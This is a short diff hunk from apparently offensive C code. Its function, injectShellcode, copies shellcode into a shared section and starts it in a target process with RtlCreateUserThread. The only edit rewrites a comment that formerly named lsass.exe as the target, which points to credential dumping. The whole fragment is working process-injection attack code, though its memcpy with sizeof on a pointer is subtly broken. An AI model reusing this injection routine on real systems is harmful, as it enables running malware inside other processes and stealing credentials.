@@ -38,7 +38,7 @@ HANDLE injectShellcode(DWORD pid, char * shellcode)
 	memcpy(localSectionAddress, shellcode, sizeof(shellcode));
 	printf("[+] Copied to local view\n");
 
-	// Attempting to create remote thread on lsass.exe in order to trigger the shellcode
+	// Attempting to create remote thread on the remote process in order to trigger the shellcode
 	HANDLE targetThreadHandle = NULL;
 	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
 	if (targetThreadHandle != NULL)
